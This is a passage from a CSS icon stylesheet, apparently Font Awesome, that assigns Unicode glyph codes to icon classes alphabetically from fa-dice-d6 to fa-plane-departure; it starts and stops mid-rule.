      content: "\f6cf"; }
      .fa-dice-d6:before {
      content: "\f6d1"; }
      .fa-dice-five:before {
      content: "\f523"; }
      .fa-dice-four:before {
      content: "\f524"; }
      .fa-dice-one:before {
      content: "\f525"; }
      .fa-dice-six:before {
      content: "\f526"; }
      .fa-dice-three:before {
      content: "\f527"; }
      .fa-dice-two:before {
      content: "\f528"; }
      .fa-digg:before {
      content: "\f1a6"; }
      .fa-digital-ocean:before {
      content: "\f391"; }
      .fa-digital-tachograph:before {
      content: "\f566"; }
      .fa-directions:before {
      content: "\f5eb"; }
      .fa-discord:before {
      content: "\f392"; }
      .fa-discourse:before {
      content: "\f393"; }
      .fa-disease:before {
      content: "\f7fa"; }
      .fa-divide:before {
      content: "\f529"; }
      .fa-dizzy:before {
      content: "\f567"; }
      .fa-dna:before {
      content: "\f471"; }
      .fa-dochub:before {
      content: "\f394"; }
      .fa-docker:before {
      content: "\f395"; }
      .fa-dog:before {
      content: "\f6d3"; }
      .fa-dollar-sign:before {
      content: "\f155"; }
      .fa-dolly:before {
      content: "\f472"; }
      .fa-dolly-flatbed:before {
      content: "\f474"; }
      .fa-donate:before {
      content: "\f4b9"; }
      .fa-door-closed:before {
      content: "\f52a"; }
      .fa-door-open:before {
      content: "\f52b"; }
      .fa-dot-circle:before {
      content: "\f192"; }
      .fa-dove:before {
      content: "\f4ba"; }
      .fa-download:before {
      content: "\f019"; }
      .fa-draft2digital:before {
      content: "\f396"; }
      .fa-drafting-compass:before {
      content: "\f568"; }
      .fa-dragon:before {
      content: "\f6d5"; }
      .fa-draw-polygon:before {
      content: "\f5ee"; }
      .fa-dribbble:before {
      content: "\f17d"; }
      .fa-dribbble-square:before {
      content: "\f397"; }
      .fa-dropbox:before {
      content: "\f16b"; }
      .fa-drum:before {
      content: "\f569"; }
      .fa-drum-steelpan:before {
      content: "\f56a"; }
      .fa-drumstick-bite:before {
      content: "\f6d7"; }
      .fa-drupal:before {
      content: "\f1a9"; }
      .fa-dumbbell:before {
      content: "\f44b"; }
      .fa-dumpster:before {
      content: "\f793"; }
      .fa-dumpster-fire:before {
      content: "\f794"; }
      .fa-dungeon:before {
      content: "\f6d9"; }
      .fa-dyalog:before {
      content: "\f399"; }
      .fa-earlybirds:before {
      content: "\f39a"; }
      .fa-ebay:before {
      content: "\f4f4"; }
      .fa-edge:before {
      content: "\f282"; }
      .fa-edit:before {
      content: "\f044"; }
      .fa-egg:before {
      content: "\f7fb"; }
      .fa-eject:before {
      content: "\f052"; }
      .fa-elementor:before {
      content: "\f430"; }
      .fa-ellipsis-h:before {
      content: "\f141"; }
      .fa-ellipsis-v:before {
      content: "\f142"; }
      .fa-ello:before {
      content: "\f5f1"; }
      .fa-ember:before {
      content: "\f423"; }
      .fa-empire:before {
      content: "\f1d1"; }
      .fa-envelope:before {
      content: "\f0e0"; }
      .fa-envelope-open:before {
      content: "\f2b6"; }
      .fa-envelope-open-text:before {
      content: "\f658"; }
      .fa-envelope-square:before {
      content: "\f199"; }
      .fa-envira:before {
      content: "\f299"; }
      .fa-equals:before {
      content: "\f52c"; }
      .fa-eraser:before {
      content: "\f12d"; }
      .fa-erlang:before {
      content: "\f39d"; }
      .fa-ethereum:before {
      content: "\f42e"; }
      .fa-ethernet:before {
      content: "\f796"; }
      .fa-etsy:before {
      content: "\f2d7"; }
      .fa-euro-sign:before {
      content: "\f153"; }
      .fa-evernote:before {
      content: "\f839"; }
      .fa-exchange-alt:before {
      content: "\f362"; }
      .fa-exclamation:before {
      content: "\f12a"; }
      .fa-exclamation-circle:before {
      content: "\f06a"; }
      .fa-exclamation-triangle:before {
      content: "\f071"; }
      .fa-expand:before {
      content: "\f065"; }
      .fa-expand-alt:before {
      content: "\f424"; }
      .fa-expand-arrows-alt:before {
      content: "\f31e"; }
      .fa-expeditedssl:before {
      content: "\f23e"; }
      .fa-external-link-alt:before {
      content: "\f35d"; }
      .fa-external-link-square-alt:before {
      content: "\f360"; }
      .fa-eye:before {
      content: "\f06e"; }
      .fa-eye-dropper:before {
      content: "\f1fb"; }
      .fa-eye-slash:before {
      content: "\f070"; }
      .fa-facebook:before {
      content: "\f09a"; }
      .fa-facebook-f:before {
      content: "\f39e"; }
      .fa-facebook-messenger:before {
      content: "\f39f"; }
      .fa-facebook-square:before {
      content: "\f082"; }
      .fa-fan:before {
      content: "\f863"; }
      .fa-fantasy-flight-games:before {
      content: "\f6dc"; }
      .fa-fast-backward:before {
      content: "\f049"; }
      .fa-fast-forward:before {
      content: "\f050"; }
      .fa-faucet:before {
      content: "\f905"; }
      .fa-fax:before {
      content: "\f1ac"; }
      .fa-feather:before {
      content: "\f52d"; }
      .fa-feather-alt:before {
      content: "\f56b"; }
      .fa-fedex:before {
      content: "\f797"; }
      .fa-fedora:before {
      content: "\f798"; }
      .fa-female:before {
      content: "\f182"; }
      .fa-fighter-jet:before {
      content: "\f0fb"; }
      .fa-figma:before {
      content: "\f799"; }
      .fa-file:before {
      content: "\f15b"; }
      .fa-file-alt:before {
      content: "\f15c"; }
      .fa-file-archive:before {
      content: "\f1c6"; }
      .fa-file-audio:before {
      content: "\f1c7"; }
      .fa-file-code:before {
      content: "\f1c9"; }
      .fa-file-contract:before {
      content: "\f56c"; }
      .fa-file-csv:before {
      content: "\f6dd"; }
      .fa-file-download:before {
      content: "\f56d"; }
      .fa-file-excel:before {
      content: "\f1c3"; }
      .fa-file-export:before {
      content: "\f56e"; }
      .fa-file-image:before {
      content: "\f1c5"; }
      .fa-file-import:before {
      content: "\f56f"; }
      .fa-file-invoice:before {
      content: "\f570"; }
      .fa-file-invoice-dollar:before {
      content: "\f571"; }
      .fa-file-medical:before {
      content: "\f477"; }
      .fa-file-medical-alt:before {
      content: "\f478"; }
      .fa-file-pdf:before {
      content: "\f1c1"; }
      .fa-file-powerpoint:before {
      content: "\f1c4"; }
      .fa-file-prescription:before {
      content: "\f572"; }
      .fa-file-signature:before {
      content: "\f573"; }
      .fa-file-upload:before {
      content: "\f574"; }
      .fa-file-video:before {
      content: "\f1c8"; }
      .fa-file-word:before {
      content: "\f1c2"; }
      .fa-fill:before {
      content: "\f575"; }
      .fa-fill-drip:before {
      content: "\f576"; }
      .fa-film:before {
      content: "\f008"; }
      .fa-filter:before {
      content: "\f0b0"; }
      .fa-fingerprint:before {
      content: "\f577"; }
      .fa-fire:before {
      content: "\f06d"; }
      .fa-fire-alt:before {
      content: "\f7e4"; }
      .fa-fire-extinguisher:before {
      content: "\f134"; }
      .fa-firefox:before {
      content: "\f269"; }
      .fa-firefox-browser:before {
      content: "\f907"; }
      .fa-first-aid:before {
      content: "\f479"; }
      .fa-first-order:before {
      content: "\f2b0"; }
      .fa-first-order-alt:before {
      content: "\f50a"; }
      .fa-firstdraft:before {
      content: "\f3a1"; }
      .fa-fish:before {
      content: "\f578"; }
      .fa-fist-raised:before {
      content: "\f6de"; }
      .fa-flag:before {
      content: "\f024"; }
      .fa-flag-checkered:before {
      content: "\f11e"; }
      .fa-flag-usa:before {
      content: "\f74d"; }
      .fa-flask:before {
      content: "\f0c3"; }
      .fa-flickr:before {
      content: "\f16e"; }
      .fa-flipboard:before {
      content: "\f44d"; }
      .fa-flushed:before {
      content: "\f579"; }
      .fa-fly:before {
      content: "\f417"; }
      .fa-folder:before {
      content: "\f07b"; }
      .fa-folder-minus:before {
      content: "\f65d"; }
      .fa-folder-open:before {
      content: "\f07c"; }
      .fa-folder-plus:before {
      content: "\f65e"; }
      .fa-font:before {
      content: "\f031"; }
      .fa-font-awesome:before {
      content: "\f2b4"; }
      .fa-font-awesome-alt:before {
      content: "\f35c"; }
      .fa-font-awesome-flag:before {
      content: "\f425"; }
      .fa-font-awesome-logo-full:before {
      content: "\f4e6"; }
      .fa-fonticons:before {
      content: "\f280"; }
      .fa-fonticons-fi:before {
      content: "\f3a2"; }
      .fa-football-ball:before {
      content: "\f44e"; }
      .fa-fort-awesome:before {
      content: "\f286"; }
      .fa-fort-awesome-alt:before {
      content: "\f3a3"; }
      .fa-forumbee:before {
      content: "\f211"; }
      .fa-forward:before {
      content: "\f04e"; }
      .fa-foursquare:before {
      content: "\f180"; }
      .fa-free-code-camp:before {
      content: "\f2c5"; }
      .fa-freebsd:before {
      content: "\f3a4"; }
      .fa-frog:before {
      content: "\f52e"; }
      .fa-frown:before {
      content: "\f119"; }
      .fa-frown-open:before {
      content: "\f57a"; }
      .fa-fulcrum:before {
      content: "\f50b"; }
      .fa-funnel-dollar:before {
      content: "\f662"; }
      .fa-futbol:before {
      content: "\f1e3"; }
      .fa-galactic-republic:before {
      content: "\f50c"; }
      .fa-galactic-senate:before {
      content: "\f50d"; }
      .fa-gamepad:before {
      content: "\f11b"; }
      .fa-gas-pump:before {
      content: "\f52f"; }
      .fa-gavel:before {
      content: "\f0e3"; }
      .fa-gem:before {
      content: "\f3a5"; }
      .fa-genderless:before {
      content: "\f22d"; }
      .fa-get-pocket:before {
      content: "\f265"; }
      .fa-gg:before {
      content: "\f260"; }
      .fa-gg-circle:before {
      content: "\f261"; }
      .fa-ghost:before {
      content: "\f6e2"; }
      .fa-gift:before {
      content: "\f06b"; }
      .fa-gifts:before {
      content: "\f79c"; }
      .fa-git:before {
      content: "\f1d3"; }
      .fa-git-alt:before {
      content: "\f841"; }
      .fa-git-square:before {
      content: "\f1d2"; }
      .fa-github:before {
      content: "\f09b"; }
      .fa-github-alt:before {
      content: "\f113"; }
      .fa-github-square:before {
      content: "\f092"; }
      .fa-gitkraken:before {
      content: "\f3a6"; }
      .fa-gitlab:before {
      content: "\f296"; }
      .fa-gitter:before {
      content: "\f426"; }
      .fa-glass-cheers:before {
      content: "\f79f"; }
      .fa-glass-martini:before {
      content: "\f000"; }
      .fa-glass-martini-alt:before {
      content: "\f57b"; }
      .fa-glass-whiskey:before {
      content: "\f7a0"; }
      .fa-glasses:before {
      content: "\f530"; }
      .fa-glide:before {
      content: "\f2a5"; }
      .fa-glide-g:before {
      content: "\f2a6"; }
      .fa-globe:before {
      content: "\f0ac"; }
      .fa-globe-africa:before {
      content: "\f57c"; }
      .fa-globe-americas:before {
      content: "\f57d"; }
      .fa-globe-asia:before {
      content: "\f57e"; }
      .fa-globe-europe:before {
      content: "\f7a2"; }
      .fa-gofore:before {
      content: "\f3a7"; }
      .fa-golf-ball:before {
      content: "\f450"; }
      .fa-goodreads:before {
      content: "\f3a8"; }
      .fa-goodreads-g:before {
      content: "\f3a9"; }
      .fa-google:before {
      content: "\f1a0"; }
      .fa-google-drive:before {
      content: "\f3aa"; }
      .fa-google-play:before {
      content: "\f3ab"; }
      .fa-google-plus:before {
      content: "\f2b3"; }
      .fa-google-plus-g:before {
      content: "\f0d5"; }
      .fa-google-plus-square:before {
      content: "\f0d4"; }
      .fa-google-wallet:before {
      content: "\f1ee"; }
      .fa-gopuram:before {
      content: "\f664"; }
      .fa-graduation-cap:before {
      content: "\f19d"; }
      .fa-gratipay:before {
      content: "\f184"; }
      .fa-grav:before {
      content: "\f2d6"; }
      .fa-greater-than:before {
      content: "\f531"; }
      .fa-greater-than-equal:before {
      content: "\f532"; }
      .fa-grimace:before {
      content: "\f57f"; }
      .fa-grin:before {
      content: "\f580"; }
      .fa-grin-alt:before {
      content: "\f581"; }
      .fa-grin-beam:before {
      content: "\f582"; }
      .fa-grin-beam-sweat:before {
      content: "\f583"; }
      .fa-grin-hearts:before {
      content: "\f584"; }
      .fa-grin-squint:before {
      content: "\f585"; }
      .fa-grin-squint-tears:before {
      content: "\f586"; }
      .fa-grin-stars:before {
      content: "\f587"; }
      .fa-grin-tears:before {
      content: "\f588"; }
      .fa-grin-tongue:before {
      content: "\f589"; }
      .fa-grin-tongue-squint:before {
      content: "\f58a"; }
      .fa-grin-tongue-wink:before {
      content: "\f58b"; }
      .fa-grin-wink:before {
      content: "\f58c"; }
      .fa-grip-horizontal:before {
      content: "\f58d"; }
      .fa-grip-lines:before {
      content: "\f7a4"; }
      .fa-grip-lines-vertical:before {
      content: "\f7a5"; }
      .fa-grip-vertical:before {
      content: "\f58e"; }
      .fa-gripfire:before {
      content: "\f3ac"; }
      .fa-grunt:before {
      content: "\f3ad"; }
      .fa-guitar:before {
      content: "\f7a6"; }
      .fa-gulp:before {
      content: "\f3ae"; }
      .fa-h-square:before {
      content: "\f0fd"; }
      .fa-hacker-news:before {
      content: "\f1d4"; }
      .fa-hacker-news-square:before {
      content: "\f3af"; }
      .fa-hackerrank:before {
      content: "\f5f7"; }
      .fa-hamburger:before {
      content: "\f805"; }
      .fa-hammer:before {
      content: "\f6e3"; }
      .fa-hamsa:before {
      content: "\f665"; }
      .fa-hand-holding:before {
      content: "\f4bd"; }
      .fa-hand-holding-heart:before {
      content: "\f4be"; }
      .fa-hand-holding-medical:before {
      content: "\f95c"; }
      .fa-hand-holding-usd:before {
      content: "\f4c0"; }
      .fa-hand-holding-water:before {
      content: "\f4c1"; }
      .fa-hand-lizard:before {
      content: "\f258"; }
      .fa-hand-middle-finger:before {
      content: "\f806"; }
      .fa-hand-paper:before {
      content: "\f256"; }
      .fa-hand-peace:before {
      content: "\f25b"; }
      .fa-hand-point-down:before {
      content: "\f0a7"; }
      .fa-hand-point-left:before {
      content: "\f0a5"; }
      .fa-hand-point-right:before {
      content: "\f0a4"; }
      .fa-hand-point-up:before {
      content: "\f0a6"; }
      .fa-hand-pointer:before {
      content: "\f25a"; }
      .fa-hand-rock:before {
      content: "\f255"; }
      .fa-hand-scissors:before {
      content: "\f257"; }
      .fa-hand-sparkles:before {
      content: "\f95d"; }
      .fa-hand-spock:before {
      content: "\f259"; }
      .fa-hands:before {
      content: "\f4c2"; }
      .fa-hands-helping:before {
      content: "\f4c4"; }
      .fa-hands-wash:before {
      content: "\f95e"; }
      .fa-handshake:before {
      content: "\f2b5"; }
      .fa-handshake-alt-slash:before {
      content: "\f95f"; }
      .fa-handshake-slash:before {
      content: "\f960"; }
      .fa-hanukiah:before {
      content: "\f6e6"; }
      .fa-hard-hat:before {
      content: "\f807"; }
      .fa-hashtag:before {
      content: "\f292"; }
      .fa-hat-cowboy:before {
      content: "\f8c0"; }
      .fa-hat-cowboy-side:before {
      content: "\f8c1"; }
      .fa-hat-wizard:before {
      content: "\f6e8"; }
      .fa-hdd:before {
      content: "\f0a0"; }
      .fa-head-side-cough:before {
      content: "\f961"; }
      .fa-head-side-cough-slash:before {
      content: "\f962"; }
      .fa-head-side-mask:before {
      content: "\f963"; }
      .fa-head-side-virus:before {
      content: "\f964"; }
      .fa-heading:before {
      content: "\f1dc"; }
      .fa-headphones:before {
      content: "\f025"; }
      .fa-headphones-alt:before {
      content: "\f58f"; }
      .fa-headset:before {
      content: "\f590"; }
      .fa-heart:before {
      content: "\f004"; }
      .fa-heart-broken:before {
      content: "\f7a9"; }
      .fa-heartbeat:before {
      content: "\f21e"; }
      .fa-helicopter:before {
      content: "\f533"; }
      .fa-highlighter:before {
      content: "\f591"; }
      .fa-hiking:before {
      content: "\f6ec"; }
      .fa-hippo:before {
      content: "\f6ed"; }
      .fa-hips:before {
      content: "\f452"; }
      .fa-hire-a-helper:before {
      content: "\f3b0"; }
      .fa-history:before {
      content: "\f1da"; }
      .fa-hockey-puck:before {
      content: "\f453"; }
      .fa-holly-berry:before {
      content: "\f7aa"; }
      .fa-home:before {
      content: "\f015"; }
      .fa-hooli:before {
      content: "\f427"; }
      .fa-hornbill:before {
      content: "\f592"; }
      .fa-horse:before {
      content: "\f6f0"; }
      .fa-horse-head:before {
      content: "\f7ab"; }
      .fa-hospital:before {
      content: "\f0f8"; }
      .fa-hospital-alt:before {
      content: "\f47d"; }
      .fa-hospital-symbol:before {
      content: "\f47e"; }
      .fa-hospital-user:before {
      content: "\f80d"; }
      .fa-hot-tub:before {
      content: "\f593"; }
      .fa-hotdog:before {
      content: "\f80f"; }
      .fa-hotel:before {
      content: "\f594"; }
      .fa-hotjar:before {
      content: "\f3b1"; }
      .fa-hourglass:before {
      content: "\f254"; }
      .fa-hourglass-end:before {
      content: "\f253"; }
      .fa-hourglass-half:before {
      content: "\f252"; }
      .fa-hourglass-start:before {
      content: "\f251"; }
      .fa-house-damage:before {
      content: "\f6f1"; }
      .fa-house-user:before {
      content: "\f965"; }
      .fa-houzz:before {
      content: "\f27c"; }
      .fa-hryvnia:before {
      content: "\f6f2"; }
      .fa-html5:before {
      content: "\f13b"; }
      .fa-hubspot:before {
      content: "\f3b2"; }
      .fa-i-cursor:before {
      content: "\f246"; }
      .fa-ice-cream:before {
      content: "\f810"; }
      .fa-icicles:before {
      content: "\f7ad"; }
      .fa-icons:before {
      content: "\f86d"; }
      .fa-id-badge:before {
      content: "\f2c1"; }
      .fa-id-card:before {
      content: "\f2c2"; }
      .fa-id-card-alt:before {
      content: "\f47f"; }
      .fa-ideal:before {
      content: "\f913"; }
      .fa-igloo:before {
      content: "\f7ae"; }
      .fa-image:before {
      content: "\f03e"; }
      .fa-images:before {
      content: "\f302"; }
      .fa-imdb:before {
      content: "\f2d8"; }
      .fa-inbox:before {
      content: "\f01c"; }
      .fa-indent:before {
      content: "\f03c"; }
      .fa-industry:before {
      content: "\f275"; }
      .fa-infinity:before {
      content: "\f534"; }
      .fa-info:before {
      content: "\f129"; }
      .fa-info-circle:before {
      content: "\f05a"; }
      .fa-instagram:before {
      content: "\f16d"; }
      .fa-instagram-square:before {
      content: "\f955"; }
      .fa-intercom:before {
      content: "\f7af"; }
      .fa-internet-explorer:before {
      content: "\f26b"; }
      .fa-invision:before {
      content: "\f7b0"; }
      .fa-ioxhost:before {
      content: "\f208"; }
      .fa-italic:before {
      content: "\f033"; }
      .fa-itch-io:before {
      content: "\f83a"; }
      .fa-itunes:before {
      content: "\f3b4"; }
      .fa-itunes-note:before {
      content: "\f3b5"; }
      .fa-java:before {
      content: "\f4e4"; }
      .fa-jedi:before {
      content: "\f669"; }
      .fa-jedi-order:before {
      content: "\f50e"; }
      .fa-jenkins:before {
      content: "\f3b6"; }
      .fa-jira:before {
      content: "\f7b1"; }
      .fa-joget:before {
      content: "\f3b7"; }
      .fa-joint:before {
      content: "\f595"; }
      .fa-joomla:before {
      content: "\f1aa"; }
      .fa-journal-whills:before {
      content: "\f66a"; }
      .fa-js:before {
      content: "\f3b8"; }
      .fa-js-square:before {
      content: "\f3b9"; }
      .fa-jsfiddle:before {
      content: "\f1cc"; }
      .fa-kaaba:before {
      content: "\f66b"; }
      .fa-kaggle:before {
      content: "\f5fa"; }
      .fa-key:before {
      content: "\f084"; }
      .fa-keybase:before {
      content: "\f4f5"; }
      .fa-keyboard:before {
      content: "\f11c"; }
      .fa-keycdn:before {
      content: "\f3ba"; }
      .fa-khanda:before {
      content: "\f66d"; }
      .fa-kickstarter:before {
      content: "\f3bb"; }
      .fa-kickstarter-k:before {
      content: "\f3bc"; }
      .fa-kiss:before {
      content: "\f596"; }
      .fa-kiss-beam:before {
      content: "\f597"; }
      .fa-kiss-wink-heart:before {
      content: "\f598"; }
      .fa-kiwi-bird:before {
      content: "\f535"; }
      .fa-korvue:before {
      content: "\f42f"; }
      .fa-landmark:before {
      content: "\f66f"; }
      .fa-language:before {
      content: "\f1ab"; }
      .fa-laptop:before {
      content: "\f109"; }
      .fa-laptop-code:before {
      content: "\f5fc"; }
      .fa-laptop-house:before {
      content: "\f966"; }
      .fa-laptop-medical:before {
      content: "\f812"; }
      .fa-laravel:before {
      content: "\f3bd"; }
      .fa-lastfm:before {
      content: "\f202"; }
      .fa-lastfm-square:before {
      content: "\f203"; }
      .fa-laugh:before {
      content: "\f599"; }
      .fa-laugh-beam:before {
      content: "\f59a"; }
      .fa-laugh-squint:before {
      content: "\f59b"; }
      .fa-laugh-wink:before {
      content: "\f59c"; }
      .fa-layer-group:before {
      content: "\f5fd"; }
      .fa-leaf:before {
      content: "\f06c"; }
      .fa-leanpub:before {
      content: "\f212"; }
      .fa-lemon:before {
      content: "\f094"; }
      .fa-less:before {
      content: "\f41d"; }
      .fa-less-than:before {
      content: "\f536"; }
      .fa-less-than-equal:before {
      content: "\f537"; }
      .fa-level-down-alt:before {
      content: "\f3be"; }
      .fa-level-up-alt:before {
      content: "\f3bf"; }
      .fa-life-ring:before {
      content: "\f1cd"; }
      .fa-lightbulb:before {
      content: "\f0eb"; }
      .fa-line:before {
      content: "\f3c0"; }
      .fa-link:before {
      content: "\f0c1"; }
      .fa-linkedin:before {
      content: "\f08c"; }
      .fa-linkedin-in:before {
      content: "\f0e1"; }
      .fa-linode:before {
      content: "\f2b8"; }
      .fa-linux:before {
      content: "\f17c"; }
      .fa-lira-sign:before {
      content: "\f195"; }
      .fa-list:before {
      content: "\f03a"; }
      .fa-list-alt:before {
      content: "\f022"; }
      .fa-list-ol:before {
      content: "\f0cb"; }
      .fa-list-ul:before {
      content: "\f0ca"; }
      .fa-location-arrow:before {
      content: "\f124"; }
      .fa-lock:before {
      content: "\f023"; }
      .fa-lock-open:before {
      content: "\f3c1"; }
      .fa-long-arrow-alt-down:before {
      content: "\f309"; }
      .fa-long-arrow-alt-left:before {
      content: "\f30a"; }
      .fa-long-arrow-alt-right:before {
      content: "\f30b"; }
      .fa-long-arrow-alt-up:before {
      content: "\f30c"; }
      .fa-low-vision:before {
      content: "\f2a8"; }
      .fa-luggage-cart:before {
      content: "\f59d"; }
      .fa-lungs:before {
      content: "\f604"; }
      .fa-lungs-virus:before {
      content: "\f967"; }
      .fa-lyft:before {
      content: "\f3c3"; }
      .fa-magento:before {
      content: "\f3c4"; }
      .fa-magic:before {
      content: "\f0d0"; }
      .fa-magnet:before {
      content: "\f076"; }
      .fa-mail-bulk:before {
      content: "\f674"; }
      .fa-mailchimp:before {
      content: "\f59e"; }
      .fa-male:before {
      content: "\f183"; }
      .fa-mandalorian:before {
      content: "\f50f"; }
      .fa-map:before {
      content: "\f279"; }
      .fa-map-marked:before {
      content: "\f59f"; }
      .fa-map-marked-alt:before {
      content: "\f5a0"; }
      .fa-map-marker:before {
      content: "\f041"; }
      .fa-map-marker-alt:before {
      content: "\f3c5"; }
      .fa-map-pin:before {
      content: "\f276"; }
      .fa-map-signs:before {
      content: "\f277"; }
      .fa-markdown:before {
      content: "\f60f"; }
      .fa-marker:before {
      content: "\f5a1"; }
      .fa-mars:before {
      content: "\f222"; }
      .fa-mars-double:before {
      content: "\f227"; }
      .fa-mars-stroke:before {
      content: "\f229"; }
      .fa-mars-stroke-h:before {
      content: "\f22b"; }
      .fa-mars-stroke-v:before {
      content: "\f22a"; }
      .fa-mask:before {
      content: "\f6fa"; }
      .fa-mastodon:before {
      content: "\f4f6"; }
      .fa-maxcdn:before {
      content: "\f136"; }
      .fa-mdb:before {
      content: "\f8ca"; }
      .fa-medal:before {
      content: "\f5a2"; }
      .fa-medapps:before {
      content: "\f3c6"; }
      .fa-medium:before {
      content: "\f23a"; }
      .fa-medium-m:before {
      content: "\f3c7"; }
      .fa-medkit:before {
      content: "\f0fa"; }
      .fa-medrt:before {
      content: "\f3c8"; }
      .fa-meetup:before {
      content: "\f2e0"; }
      .fa-megaport:before {
      content: "\f5a3"; }
      .fa-meh:before {
      content: "\f11a"; }
      .fa-meh-blank:before {
      content: "\f5a4"; }
      .fa-meh-rolling-eyes:before {
      content: "\f5a5"; }
      .fa-memory:before {
      content: "\f538"; }
      .fa-mendeley:before {
      content: "\f7b3"; }
      .fa-menorah:before {
      content: "\f676"; }
      .fa-mercury:before {
      content: "\f223"; }
      .fa-meteor:before {
      content: "\f753"; }
      .fa-microblog:before {
      content: "\f91a"; }
      .fa-microchip:before {
      content: "\f2db"; }
      .fa-microphone:before {
      content: "\f130"; }
      .fa-microphone-alt:before {
      content: "\f3c9"; }
      .fa-microphone-alt-slash:before {
      content: "\f539"; }
      .fa-microphone-slash:before {
      content: "\f131"; }
      .fa-microscope:before {
      content: "\f610"; }
      .fa-microsoft:before {
      content: "\f3ca"; }
      .fa-minus:before {
      content: "\f068"; }
      .fa-minus-circle:before {
      content: "\f056"; }
      .fa-minus-square:before {
      content: "\f146"; }
      .fa-mitten:before {
      content: "\f7b5"; }
      .fa-mix:before {
      content: "\f3cb"; }
      .fa-mixcloud:before {
      content: "\f289"; }
      .fa-mixer:before {
      content: "\f956"; }
      .fa-mizuni:before {
      content: "\f3cc"; }
      .fa-mobile:before {
      content: "\f10b"; }
      .fa-mobile-alt:before {
      content: "\f3cd"; }
      .fa-modx:before {
      content: "\f285"; }
      .fa-monero:before {
      content: "\f3d0"; }
      .fa-money-bill:before {
      content: "\f0d6"; }
      .fa-money-bill-alt:before {
      content: "\f3d1"; }
      .fa-money-bill-wave:before {
      content: "\f53a"; }
      .fa-money-bill-wave-alt:before {
      content: "\f53b"; }
      .fa-money-check:before {
      content: "\f53c"; }
      .fa-money-check-alt:before {
      content: "\f53d"; }
      .fa-monument:before {
      content: "\f5a6"; }
      .fa-moon:before {
      content: "\f186"; }
      .fa-mortar-pestle:before {
      content: "\f5a7"; }
      .fa-mosque:before {
      content: "\f678"; }
      .fa-motorcycle:before {
      content: "\f21c"; }
      .fa-mountain:before {
      content: "\f6fc"; }
      .fa-mouse:before {
      content: "\f8cc"; }
      .fa-mouse-pointer:before {
      content: "\f245"; }
      .fa-mug-hot:before {
      content: "\f7b6"; }
      .fa-music:before {
      content: "\f001"; }
      .fa-napster:before {
      content: "\f3d2"; }
      .fa-neos:before {
      content: "\f612"; }
      .fa-network-wired:before {
      content: "\f6ff"; }
      .fa-neuter:before {
      content: "\f22c"; }
      .fa-newspaper:before {
      content: "\f1ea"; }
      .fa-nimblr:before {
      content: "\f5a8"; }
      .fa-node:before {
      content: "\f419"; }
      .fa-node-js:before {
      content: "\f3d3"; }
      .fa-not-equal:before {
      content: "\f53e"; }
      .fa-notes-medical:before {
      content: "\f481"; }
      .fa-npm:before {
      content: "\f3d4"; }
      .fa-ns8:before {
      content: "\f3d5"; }
      .fa-nutritionix:before {
      content: "\f3d6"; }
      .fa-object-group:before {
      content: "\f247"; }
      .fa-object-ungroup:before {
      content: "\f248"; }
      .fa-odnoklassniki:before {
      content: "\f263"; }
      .fa-odnoklassniki-square:before {
      content: "\f264"; }
      .fa-oil-can:before {
      content: "\f613"; }
      .fa-old-republic:before {
      content: "\f510"; }
      .fa-om:before {
      content: "\f679"; }
      .fa-opencart:before {
      content: "\f23d"; }
      .fa-openid:before {
      content: "\f19b"; }
      .fa-opera:before {
      content: "\f26a"; }
      .fa-optin-monster:before {
      content: "\f23c"; }
      .fa-orcid:before {
      content: "\f8d2"; }
      .fa-osi:before {
      content: "\f41a"; }
      .fa-otter:before {
      content: "\f700"; }
      .fa-outdent:before {
      content: "\f03b"; }
      .fa-page4:before {
      content: "\f3d7"; }
      .fa-pagelines:before {
      content: "\f18c"; }
      .fa-pager:before {
      content: "\f815"; }
      .fa-paint-brush:before {
      content: "\f1fc"; }
      .fa-paint-roller:before {
      content: "\f5aa"; }
      .fa-palette:before {
      content: "\f53f"; }
      .fa-palfed:before {
      content: "\f3d8"; }
      .fa-pallet:before {
      content: "\f482"; }
      .fa-paper-plane:before {
      content: "\f1d8"; }
      .fa-paperclip:before {
      content: "\f0c6"; }
      .fa-parachute-box:before {
      content: "\f4cd"; }
      .fa-paragraph:before {
      content: "\f1dd"; }
      .fa-parking:before {
      content: "\f540"; }
      .fa-passport:before {
      content: "\f5ab"; }
      .fa-pastafarianism:before {
      content: "\f67b"; }
      .fa-paste:before {
      content: "\f0ea"; }
      .fa-patreon:before {
      content: "\f3d9"; }
      .fa-pause:before {
      content: "\f04c"; }
      .fa-pause-circle:before {
      content: "\f28b"; }
      .fa-paw:before {
      content: "\f1b0"; }
      .fa-paypal:before {
      content: "\f1ed"; }
      .fa-peace:before {
      content: "\f67c"; }
      .fa-pen:before {
      content: "\f304"; }
      .fa-pen-alt:before {
      content: "\f305"; }
      .fa-pen-fancy:before {
      content: "\f5ac"; }
      .fa-pen-nib:before {
      content: "\f5ad"; }
      .fa-pen-square:before {
      content: "\f14b"; }
      .fa-pencil-alt:before {
      content: "\f303"; }
      .fa-pencil-ruler:before {
      content: "\f5ae"; }
      .fa-penny-arcade:before {
      content: "\f704"; }
      .fa-people-arrows:before {
      content: "\f968"; }
      .fa-people-carry:before {
      content: "\f4ce"; }
      .fa-pepper-hot:before {
      content: "\f816"; }
      .fa-percent:before {
      content: "\f295"; }
      .fa-percentage:before {
      content: "\f541"; }
      .fa-periscope:before {
      content: "\f3da"; }
      .fa-person-booth:before {
      content: "\f756"; }
      .fa-phabricator:before {
      content: "\f3db"; }
      .fa-phoenix-framework:before {
      content: "\f3dc"; }
      .fa-phoenix-squadron:before {
      content: "\f511"; }
      .fa-phone:before {
      content: "\f095"; }
      .fa-phone-alt:before {
      content: "\f879"; }
      .fa-phone-slash:before {
      content: "\f3dd"; }
      .fa-phone-square:before {
      content: "\f098"; }
      .fa-phone-square-alt:before {
      content: "\f87b"; }
      .fa-phone-volume:before {
      content: "\f2a0"; }
      .fa-photo-video:before {
      content: "\f87c"; }
      .fa-php:before {
      content: "\f457"; }
      .fa-pied-piper:before {
      content: "\f2ae"; }
      .fa-pied-piper-alt:before {
      content: "\f1a8"; }
      .fa-pied-piper-hat:before {
      content: "\f4e5"; }
      .fa-pied-piper-pp:before {
      content: "\f1a7"; }
      .fa-pied-piper-square:before {
      content: "\f91e"; }
      .fa-piggy-bank:before {
      content: "\f4d3"; }
      .fa-pills:before {
      content: "\f484"; }
      .fa-pinterest:before {
      content: "\f0d2"; }
      .fa-pinterest-p:before {
      content: "\f231"; }
      .fa-pinterest-square:before {
      content: "\f0d3"; }
      .fa-pizza-slice:before {
      content: "\f818"; }
      .fa-place-of-worship:before {
      content: "\f67f"; }
      .fa-plane:before {
      content: "\f072"; }
      .fa-plane-arrival:before {
      content: "\f5af"; }
      .fa-plane-departure:before {
